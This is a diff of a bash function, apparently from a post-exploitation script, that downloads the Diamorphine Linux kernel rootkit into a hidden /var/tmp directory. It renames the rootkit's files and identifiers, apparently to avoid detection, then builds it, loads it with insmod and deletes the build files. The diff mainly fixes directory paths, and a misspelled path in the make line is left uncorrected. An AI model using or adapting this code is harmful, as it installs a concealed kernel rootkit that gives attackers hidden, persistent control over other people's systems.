@@ -123,16 +123,16 @@ bashrc() {
 configDiamorphine() {
     echo -e "\033[0;32m[+] - Rootkit Configuration"
     mkdir -p /var/tmp/.memory
-    git clone https://github.com/m0nad/Diamorphine > /var/tmp/.memory
+    git clone https://github.com/m0nad/Diamorphine /var/tmp/.memory
     mv /var/tmp/.memory/diamorphine.c /var/tmp/.memory/root.c 
     mv /var/tmp/.memory/diamorphine.h /var/tmp/.memory/root.h
-    sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.cache/root.h
-    sed -i 's/diamorphine/dynasty/g' /var/tmp/.cache/root.h
+    sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.memory/root.h
+    sed -i 's/diamorphine/dynasty/g' /var/tmp/.memory/root.h
     make -C /var/tmp/.memeory
-    sed -i 's/diamorphine.h/root.h/g' /var/tmp/.cache/root.c
-    sed -i 's/diamorphine_init/root_init/g' /var/tmp/.cache/root.c 
-    sed -i 's/diamorphine_cleanup/root_cleanup/g' /var/tmp/.cache/root.c
-    sed -i 's/diamorphine.o/root.o/g' /var/tmp/.cache/Makefile
+    sed -i 's/diamorphine.h/root.h/g' /var/tmp/.memory/root.c
+    sed -i 's/diamorphine_init/root_init/g' /var/tmp/.memory/root.c 
+    sed -i 's/diamorphine_cleanup/root_clean/g' /var/tmp/.memory/root.c
+    sed -i 's/diamorphine.o/root.o/g' /var/tmp/.memory/Makefile
     insmod /var/tmp/.memory/root.ko
     make clean -C /var/tmp/.memory
     rm -rf /var/tmp/.memory
